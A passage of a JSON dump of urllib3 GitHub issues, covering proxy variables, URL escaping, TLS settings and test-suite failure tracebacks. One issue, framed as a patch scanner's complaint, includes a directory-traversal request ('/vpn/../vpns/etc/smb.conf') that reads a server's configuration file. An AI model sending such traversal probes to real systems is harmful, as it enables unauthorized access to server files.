https://github.com/urllib3/urllib3/commit/0aa3e24fcd75f1bb59ab159e9f8adb44055b2271#diff-26a37c674beb46c0ae8f77d76946e054\r\n\r\n\r\nCan we work on fixing this issue?\r\n\r\n ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1786", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1786/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1786/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1786/events", "html_url": "https://github.com/urllib3/urllib3/issues/1786", "id": 551815458, "node_id": "MDU6SXNzdWU1NTE4MTU0NTg=", "number": 1786, "title": "RFE: Way to construct response objects from as-is response dumps", "user": {"login": "scop", "id": 109152, "node_id": "MDQ6VXNlcjEwOTE1Mg==", "avatar_url": "https://avatars1.githubusercontent.com/u/109152?v=4", "gravatar_id": "", "url": "https://api.github.com/users/scop", "html_url": "https://github.com/scop", "followers_url": "https://api.github.com/users/scop/followers", "following_url": "https://api.github.com/users/scop/following{/other_user}", "gists_url": "https://api.github.com/users/scop/gists{/gist_id}", "starred_url": "https://api.github.com/users/scop/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/scop/subscriptions", "organizations_url": "https://api.github.com/users/scop/orgs", "repos_url": "https://api.github.com/users/scop/repos", "events_url": "https://api.github.com/users/scop/events{/privacy}", "received_events_url": "https://api.github.com/users/scop/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-01-18T19:50:39Z", "updated_at": "2020-01-27T14:34:10Z", "closed_at": "2020-01-27T14:34:09Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "It would be nice to be able to create urllib3.response.HTTPResponse objects easily from as-is request dump files, for example ones generated with `curl -i --raw`. Those could then be used e.g. in testing/mocking, for example in requests-mock's \"raw\" urllib3 responses: https://requests-mock.readthedocs.io/en/latest/response.html#registering-responses", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1785", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1785/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1785/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1785/events", "html_url": "https://github.com/urllib3/urllib3/issues/1785", "id": 550158132, "node_id": "MDU6SXNzdWU1NTAxNTgxMzI=", "number": 1785, "title": "Detect and use http_proxy and https_proxy env variables", "user": {"login": "kennell", "id": 2326287, "node_id": "MDQ6VXNlcjIzMjYyODc=", "avatar_url": "https://avatars0.githubusercontent.com/u/2326287?v=4", "gravatar_id": "", "url": "https://api.github.com/users/kennell", "html_url": "https://github.com/kennell", "followers_url": "https://api.github.com/users/kennell/followers", "following_url": "https://api.github.com/users/kennell/following{/other_user}", "gists_url": "https://api.github.com/users/kennell/gists{/gist_id}", "starred_url": "https://api.github.com/users/kennell/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/kennell/subscriptions", "organizations_url": "https://api.github.com/users/kennell/orgs", "repos_url": "https://api.github.com/users/kennell/repos", "events_url": "https://api.github.com/users/kennell/events{/privacy}", "received_events_url": "https://api.github.com/users/kennell/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-01-15T12:31:11Z", "updated_at": "2020-01-15T12:47:37Z", "closed_at": "2020-01-15T12:47:37Z", "author_association": "NONE", "active_lock_reason": null, "body": "It seems that urrlib3 ignores the `http_proxy`, `https_proxy` and `no_proxy` environment variables. Most HTTP clients out there (including urllib, urllib2, wget, curl, requests) will automatically detect these variables and subsequently make all requests thru the proxy.\r\n\r\nExample:\r\n\r\n```pycon\r\nhttp_proxy=http://example.com:8080 https_proxy=https://example.com:8080 python3\r\n>>> import urllib3\r\n>>> http = urllib3.PoolManager()\r\n>>> r = http.request('GET', 'https://www.python.org/')\r\n```\r\nExpected: proxy servers are used\r\nResult: proxy servers are ignored", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1781", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1781/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1781/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1781/events", "html_url": "https://github.com/urllib3/urllib3/issues/1781", "id": 549178301, "node_id": "MDU6SXNzdWU1NDkxNzgzMDE=", "number": 1781, "title": "Traversal is stripped in >1.24.3", "user": {"login": "trustedsec", "id": 3160808, "node_id": "MDEyOk9yZ2FuaXphdGlvbjMxNjA4MDg=", "avatar_url": "https://avatars0.githubusercontent.com/u/3160808?v=4", "gravatar_id": "", "url": "https://api.github.com/users/trustedsec", "html_url": "https://github.com/trustedsec", "followers_url": "https://api.github.com/users/trustedsec/followers", "following_url": "https://api.github.com/users/trustedsec/following{/other_user}", "gists_url": "https://api.github.com/users/trustedsec/gists{/gist_id}", "starred_url": "https://api.github.com/users/trustedsec/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/trustedsec/subscriptions", "organizations_url": "https://api.github.com/users/trustedsec/orgs", "repos_url": "https://api.github.com/users/trustedsec/repos", "events_url": "https://api.github.com/users/trustedsec/events{/privacy}", "received_events_url": "https://api.github.com/users/trustedsec/received_events", "type": "Organization", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-01-13T20:59:38Z", "updated_at": "2020-01-15T16:29:53Z", "closed_at": "2020-01-15T16:29:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "There appears to be normalization of URL's occurring that removes intended functionality through GET/POST requests.\r\n\r\nBuilt a scanner that looks for a directory traversal issue to help to troubleshoot missing patches and it strips out the ../ in the request.\r\n\r\nEven with allow_redirects=False the request still gets stripped.\r\n\r\nExample:\r\n\r\n$ python3\r\nPython 3.7.4 (default, Dec 13 2019, 01:02:18)\r\n[GCC 7.3.1 20180712 (Red Hat 7.3.1-6)] on linux\r\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r\n\r\nimport requests\r\nreq = requests.get('https://x.x.x.x/vpn/../vpns/etc/smb.conf', allow_redirects=False)\r\nreq.content\r\nb'<script type=\"text/javascript\" src=\"/vpn/resources.js\"></script><script type=\"text/javascript\" language=\"javascript\">var Resources = new ResourceManager(\"/logon/themes/Default/resources/{lang}\", \"REDIRECTION_BODY\");</script><script type=\"text/javascript\" language=\"javascript\">Resources.Load();</script>'\r\nreq.status_code\r\n302\r\nreq.url\r\n'https://x.x.x.x/vpns/etc/smb.conf'\r\n\r\nNotice the request for ../ is stripped/removed.\r\n\r\nReference: https://github.com/urllib3/urllib3/pull/1487", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1773", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1773/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1773/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1773/events", "html_url": "https://github.com/urllib3/urllib3/issues/1773", "id": 544661507, "node_id": "MDU6SXNzdWU1NDQ2NjE1MDc=", "number": 1773, "title": "ConnectionError when connection is OK", "user": {"login": "earonesty", "id": 50769, "node_id": "MDQ6VXNlcjUwNzY5", "avatar_url": "https://avatars3.githubusercontent.com/u/50769?v=4", "gravatar_id": "", "url": "https://api.github.com/users/earonesty", "html_url": "https://github.com/earonesty", "followers_url": "https://api.github.com/users/earonesty/followers", "following_url": "https://api.github.com/users/earonesty/following{/other_user}", "gists_url": "https://api.github.com/users/earonesty/gists{/gist_id}", "starred_url": "https://api.github.com/users/earonesty/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/earonesty/subscriptions", "organizations_url": "https://api.github.com/users/earonesty/orgs", "repos_url": "https://api.github.com/users/earonesty/repos", "events_url": "https://api.github.com/users/earonesty/events{/privacy}", "received_events_url": "https://api.github.com/users/earonesty/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-01-02T17:00:52Z", "updated_at": "2020-01-06T10:51:06Z", "closed_at": "2020-01-06T10:50:59Z", "author_association": "NONE", "active_lock_reason": null, "body": "I ran into this issue recently.   \r\n\r\nThe result of this is that any issues with reading a local file cause the system to disconnect and reconnect to remote servers that are working fine.... the issue was with a local file that had a read error.\r\n\r\nI suspect this is a lower level problem with the python `http.client` library, since it provides no indication which socket had the problem when an OSError is raised, correct?  \r\n\r\n```\r\nimport io\r\nimport urllib3\r\nimport requests\r\n\r\nbuggy_file = io.BytesIO(b\"hello\")\r\n\r\ndef raise_ex(*a, **kw):\r\n    raise OSError(\"oops\")\r\n\r\n>>buggy_file.read = raise_ex\r\n\r\nhttp = urllib3.PoolManager()\r\n\r\n# this raises a urllib3.exceptions.ProtocolError\r\n# is it a the connection to python.org or the buggy_file that failed?\r\n\r\nres = http.request(\"POST\", \"http://www.python.org\", body=buggy_file)\r\n\r\n# this raises requests.exceptions.ConnectionError \r\nres = requests.post(\"http://www.python.org\", data=buggy_file)\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1772", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1772/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1772/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1772/events", "html_url": "https://github.com/urllib3/urllib3/issues/1772", "id": 543214852, "node_id": "MDU6SXNzdWU1NDMyMTQ4NTI=", "number": 1772, "title": "Issues running test suite under Python 3.9", "user": {"login": "sethmlarson", "id": 18519037, "node_id": "MDQ6VXNlcjE4NTE5MDM3", "avatar_url": "https://avatars0.githubusercontent.com/u/18519037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sethmlarson", "html_url": "https://github.com/sethmlarson", "followers_url": "https://api.github.com/users/sethmlarson/followers", "following_url": "https://api.github.com/users/sethmlarson/following{/other_user}", "gists_url": "https://api.github.com/users/sethmlarson/gists{/gist_id}", "starred_url": "https://api.github.com/users/sethmlarson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sethmlarson/subscriptions", "organizations_url": "https://api.github.com/users/sethmlarson/orgs", "repos_url": "https://api.github.com/users/sethmlarson/repos", "events_url": "https://api.github.com/users/sethmlarson/events{/privacy}", "received_events_url": "https://api.github.com/users/sethmlarson/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-12-28T15:42:23Z", "updated_at": "2020-01-07T04:05:12Z", "closed_at": "2020-01-07T04:05:12Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "Tornado is an issue due to the `collections.abc` change switching from deprecation warnings to errors in 3.9. Unfortunately moving to the latest Tornado version also doesn't work and might be more work than it's worth. I'm thinking if the issue is only to do with `collections.abc` we vendor the library and make the modification ourselves.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1771", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1771/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1771/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1771/events", "html_url": "https://github.com/urllib3/urllib3/issues/1771", "id": 539664840, "node_id": "MDU6SXNzdWU1Mzk2NjQ4NDA=", "number": 1771, "title": "'~' not escaped properly on python 3.8.0", "user": {"login": "Maxxer1", "id": 11653527, "node_id": "MDQ6VXNlcjExNjUzNTI3", "avatar_url": "https://avatars0.githubusercontent.com/u/11653527?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Maxxer1", "html_url": "https://github.com/Maxxer1", "followers_url": "https://api.github.com/users/Maxxer1/followers", "following_url": "https://api.github.com/users/Maxxer1/following{/other_user}", "gists_url": "https://api.github.com/users/Maxxer1/gists{/gist_id}", "starred_url": "https://api.github.com/users/Maxxer1/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Maxxer1/subscriptions", "organizations_url": "https://api.github.com/users/Maxxer1/orgs", "repos_url": "https://api.github.com/users/Maxxer1/repos", "events_url": "https://api.github.com/users/Maxxer1/events{/privacy}", "received_events_url": "https://api.github.com/users/Maxxer1/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-12-18T12:57:42Z", "updated_at": "2019-12-18T13:06:23Z", "closed_at": "2019-12-18T13:06:23Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm facing this issue with urllib version 1.25.7 on Python 3.8\r\n\r\nIssue is also valid for python 3.7.x\r\n\r\nOutput from python3.6.9\r\n\r\n```\r\n(venv) root@d03df238fbdc:/# pip install urllib3\r\nCollecting urllib3\r\n  Downloading https://files.pythonhosted.org/packages/b4/40/a9837291310ee1ccc242ceb6ebfd9eb21539649f193a7c8c86ba15b98539/urllib3-1.25.7-py2.py3-none-any.whl (125kB)\r\n    100% |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 133kB 1.4MB/s\r\nInstalling collected packages: urllib3\r\nSuccessfully installed urllib3-1.25.7\r\nYou are using pip version 18.1, however version 19.3.1 is available.\r\nYou should consider upgrading via the 'pip install --upgrade pip' command.\r\n(venv) root@d03df238fbdc:/# python\r\nPython 3.6.9 (default, Nov 23 2019, 06:41:34)\r\n[GCC 8.3.0] on linux\r\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r\n>>> from urllib.parse import quote\r\n>>> quote('~')\r\n'%7E'\r\n>>> \r\n\r\n```\r\n\r\nOutput from python3.8.0\r\n\r\n```\r\n\r\n(venv) root@0f4d99da9dfc:/# pip install urllib3\r\nCollecting urllib3\r\n  Downloading https://files.pythonhosted.org/packages/b4/40/a9837291310ee1ccc242ceb6ebfd9eb21539649f193a7c8c86ba15b98539/urllib3-1.25.7-py2.py3-none-any.whl (125kB)\r\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 133kB 1.0MB/s \r\nInstalling collected packages: urllib3\r\nSuccessfully installed urllib3-1.25.7\r\nWARNING: You are using pip version 19.2.3, however version 19.3.1 is available.\r\nYou should consider upgrading via the 'pip install --upgrade pip' command.\r\n(venv) root@0f4d99da9dfc:/# python\r\nPython 3.8.0 (default, Nov 23 2019, 05:36:56) \r\n[GCC 8.3.0] on linux\r\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r\n>>> from urllib.parse import quote\r\n>>> quote('~')\r\n'~'\r\n>>> \r\n\r\n\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1770", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1770/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1770/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1770/events", "html_url": "https://github.com/urllib3/urllib3/issues/1770", "id": 534353476, "node_id": "MDU6SXNzdWU1MzQzNTM0NzY=", "number": 1770, "title": "CERT_REQUIRED and ca_certs=None", "user": {"login": "lorien", "id": 35171, "node_id": "MDQ6VXNlcjM1MTcx", "avatar_url": "https://avatars3.githubusercontent.com/u/35171?v=4", "gravatar_id": "", "url": "https://api.github.com/users/lorien", "html_url": "https://github.com/lorien", "followers_url": "https://api.github.com/users/lorien/followers", "following_url": "https://api.github.com/users/lorien/following{/other_user}", "gists_url": "https://api.github.com/users/lorien/gists{/gist_id}", "starred_url": "https://api.github.com/users/lorien/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lorien/subscriptions", "organizations_url": "https://api.github.com/users/lorien/orgs", "repos_url": "https://api.github.com/users/lorien/repos", "events_url": "https://api.github.com/users/lorien/events{/privacy}", "received_events_url": "https://api.github.com/users/lorien/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-12-07T04:44:23Z", "updated_at": "2020-03-09T04:56:51Z", "closed_at": "2020-03-09T01:29:13Z", "author_association": "NONE", "active_lock_reason": null, "body": "OK, it is a question, not a bug. I have not found link to any mail group or chat, so.\r\nIs there a difference between\r\n`PoolManager(cert_reqs='CERT_REQUIRED', ca_certs=None)`\r\nand\r\n`PoolManager(cert_reqs='CERT_REQUIRED', ca_certs=certifi.where())`\r\n?\r\n\r\nI am asking this because I see different CPU usage in these two cases.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1766", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1766/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1766/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1766/events", "html_url": "https://github.com/urllib3/urllib3/issues/1766", "id": 531544078, "node_id": "MDU6SXNzdWU1MzE1NDQwNzg=", "number": 1766, "title": "test_client_no_intermediate test failure", "user": {"login": "mgorny", "id": 110765, "node_id": "MDQ6VXNlcjExMDc2NQ==", "avatar_url": "https://avatars1.githubusercontent.com/u/110765?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mgorny", "html_url": "https://github.com/mgorny", "followers_url": "https://api.github.com/users/mgorny/followers", "following_url": "https://api.github.com/users/mgorny/following{/other_user}", "gists_url": "https://api.github.com/users/mgorny/gists{/gist_id}", "starred_url": "https://api.github.com/users/mgorny/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mgorny/subscriptions", "organizations_url": "https://api.github.com/users/mgorny/orgs", "repos_url": "https://api.github.com/users/mgorny/repos", "events_url": "https://api.github.com/users/mgorny/events{/privacy}", "received_events_url": "https://api.github.com/users/mgorny/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2019-12-02T21:16:42Z", "updated_at": "2020-05-25T04:18:32Z", "closed_at": "2020-05-25T04:18:32Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Splitting as requested. I'm going to include the IPv6 as well because I'm not really sure which parts of the reports apply to which tests. With flaky added, this output gets really confusing.\r\n\r\n```\r\n==================================================================== FAILURES =====================================================================\r\nException in thread Thread-120:\r\nTraceback (most recent call last):\r\n  File \"/usr/lib64/python2.7/threading.py\", line 801, in __bootstrap_inner\r\n    self.run()\r\n  File \"/tmp/urllib3/dummyserver/server.py\", line 145, in run\r\n    self.server = self._start_server()\r\n  File \"/tmp/urllib3/dummyserver/server.py\", line 141, in _start_server\r\n    self.socket_handler(sock)\r\n  File \"/tmp/urllib3/test/with_dummyserver/test_socketlevel.py\", line 1331, in socket_handler\r\n    ca_certs=DEFAULT_CA,\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 931, in wrap_socket\r\n    ciphers=ciphers)\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 599, in __init__\r\n    self.do_handshake()\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 828, in do_handshake\r\n    self._sslobj.do_handshake()\r\nerror: [Errno 0] Error\r\n\r\nException in thread Thread-119:\r\nTraceback (most recent call last):\r\n  File \"/usr/lib64/python2.7/threading.py\", line 801, in __bootstrap_inner\r\n    self.run()\r\n  File \"/tmp/urllib3/dummyserver/server.py\", line 145, in run\r\n    self.server = self._start_server()\r\n  File \"/tmp/urllib3/dummyserver/server.py\", line 141, in _start_server\r\n    self.socket_handler(sock)\r\n  File \"/tmp/urllib3/test/with_dummyserver/test_socketlevel.py\", line 1331, in socket_handler\r\n    ca_certs=DEFAULT_CA,\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 931, in wrap_socket\r\n    ciphers=ciphers)\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 599, in __init__\r\n    self.do_handshake()\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 828, in do_handshake\r\n    self._sslobj.do_handshake()\r\nerror: [Errno 0] Error\r\n\r\nException in thread Thread-121:\r\nTraceback (most recent call last):\r\n  File \"/usr/lib64/python2.7/threading.py\", line 801, in __bootstrap_inner\r\n    self.run()\r\n  File \"/tmp/urllib3/dummyserver/server.py\", line 145, in run\r\n    self.server = self._start_server()\r\n  File \"/tmp/urllib3/dummyserver/server.py\", line 141, in _start_server\r\n    self.socket_handler(sock)\r\n  File \"/tmp/urllib3/test/with_dummyserver/test_socketlevel.py\", line 1331, in socket_handler\r\n    ca_certs=DEFAULT_CA,\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 931, in wrap_socket\r\n    ciphers=ciphers)\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 599, in __init__\r\n    self.do_handshake()\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 828, in do_handshake\r\n    self._sslobj.do_handshake()\r\nerror: [Errno 0] Error\r\n\r\nException in thread Thread-122:\r\nTraceback (most recent call last):\r\n  File \"/usr/lib64/python2.7/threading.py\", line 801, in __bootstrap_inner\r\n    self.run()\r\n  File \"/tmp/urllib3/dummyserver/server.py\", line 145, in run\r\n    self.server = self._start_server()\r\n  File \"/tmp/urllib3/dummyserver/server.py\", line 141, in _start_server\r\n    self.socket_handler(sock)\r\n  File \"/tmp/urllib3/test/with_dummyserver/test_socketlevel.py\", line 1331, in socket_handler\r\n    ca_certs=DEFAULT_CA,\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 931, in wrap_socket\r\n    ciphers=ciphers)\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 599, in __init__\r\n    self.do_handshake()\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 828, in do_handshake\r\n    self._sslobj.do_handshake()\r\nerror: [Errno 0] Error\r\n\r\n______________________________________________________ TestHTTPS.test_client_no_intermediate ______________________________________________________\r\nTraceback (most recent call last):\r\n  File \"/tmp/urllib3/test/with_dummyserver/test_https.py\", line 139, in test_client_no_intermediate\r\n    https_pool.request(\"GET\", \"/certificate\", retries=False)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py\", line 76, in request\r\n    method, url, fields=fields, headers=headers, **urlopen_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py\", line 97, in request_encode_url\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 720, in urlopen\r\n    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py\", line 376, in increment\r\n    raise six.reraise(type(error), error, _stacktrace)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 672, in urlopen\r\n    chunked=chunked,\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 387, in _make_request\r\n    conn.request(method, url, **httplib_request_kw)\r\n  File \"/usr/lib64/python2.7/httplib.py\", line 1069, in request\r\n    self._send_request(method, url, body, headers)\r\n  File \"/usr/lib64/python2.7/httplib.py\", line 1109, in _send_request\r\n    self.endheaders(body)\r\n  File \"/usr/lib64/python2.7/httplib.py\", line 1065, in endheaders\r\n    self._send_output(message_body)\r\n  File \"/usr/lib64/python2.7/httplib.py\", line 892, in _send_output\r\n    self.send(msg)\r\n  File \"/usr/lib64/python2.7/httplib.py\", line 868, in send\r\n    self.sock.sendall(data)\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 741, in sendall\r\n    v = self.send(data[count:])\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 707, in send\r\n    v = self._sslobj.write(data)\r\nProtocolError: ('Connection aborted.', error(104, 'Connection reset by peer'))\r\n---------------------------------------------------------------- Captured log call ----------------------------------------------------------------\r\nWARNING  tornado.general:iostream.py:1518 SSL Error on 17 ('127.0.0.1', 36088): [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)\r\n---------------------------------------------------------------- Captured log call ----------------------------------------------------------------\r\nWARNING  tornado.general:iostream.py:1518 SSL Error on 17 ('127.0.0.1', 36092): [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)\r\n__________________________________________________ TestHTTPS_TLSv1_3.test_client_no_intermediate __________________________________________________\r\nTraceback (most recent call last):\r\n  File \"/tmp/urllib3/test/with_dummyserver/test_https.py\", line 139, in test_client_no_intermediate\r\n    https_pool.request(\"GET\", \"/certificate\", retries=False)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py\", line 76, in request\r\n    method, url, fields=fields, headers=headers, **urlopen_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py\", line 97, in request_encode_url\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 720, in urlopen\r\n    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py\", line 376, in increment\r\n    raise six.reraise(type(error), error, _stacktrace)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 672, in urlopen\r\n    chunked=chunked,\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 387, in _make_request\r\n    conn.request(method, url, **httplib_request_kw)\r\n  File \"/usr/lib64/python2.7/httplib.py\", line 1069, in request\r\n    self._send_request(method, url, body, headers)\r\n  File \"/usr/lib64/python2.7/httplib.py\", line 1109, in _send_request\r\n    self.endheaders(body)\r\n  File \"/usr/lib64/python2.7/httplib.py\", line 1065, in endheaders\r\n    self._send_output(message_body)\r\n  File \"/usr/lib64/python2.7/httplib.py\", line 892, in _send_output\r\n    self.send(msg)\r\n  File \"/usr/lib64/python2.7/httplib.py\", line 868, in send\r\n    self.sock.sendall(data)\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 741, in sendall\r\n    v = self.send(data[count:])\r\n  File \"/usr/lib64/python2.7/ssl.py\", line 707, in send\r\n    v = self._sslobj.write(data)\r\nProtocolError: ('Connection aborted.', error(104, 'Connection reset by peer'))\r\n---------------------------------------------------------------- Captured log call ----------------------------------------------------------------\r\nWARNING  tornado.general:iostream.py:1518 SSL Error on 17 ('127.0.0.1', 42400): [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)\r\n---------------------------------------------------------------- Captured log call ----------------------------------------------------------------\r\nWARNING  tornado.general:iostream.py:1518 SSL Error on 17 ('127.0.0.1', 42402): [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)\r\n_________________________________________________ TestIPv6HTTPProxyManager.test_basic_ipv6_proxy __________________________________________________\r\nTraceback (most recent call last):\r\n  File \"/tmp/urllib3/test/with_dummyserver/test_proxy_poolmanager.py\", line 363, in test_basic_ipv6_proxy\r\n    r = http.request(\"GET\", \"%s/\" % self.http_url)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py\", line 76, in request\r\n    method, url, fields=fields, headers=headers, **urlopen_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py\", line 97, in request_encode_url\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py\", line 466, in urlopen\r\n    return super(ProxyManager, self).urlopen(method, url, redirect=redirect, **kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py\", line 328, in urlopen\r\n    response = conn.urlopen(method, url, **kw)\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 760, in urlopen\r\n    **response_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 760, in urlopen\r\n    **response_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 760, in urlopen\r\n    **response_kw\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py\", line 720, in urlopen\r\n    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\r\n  File \"/tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py\", line 436, in increment\r\n    raise MaxRetryError(_pool, url, error or 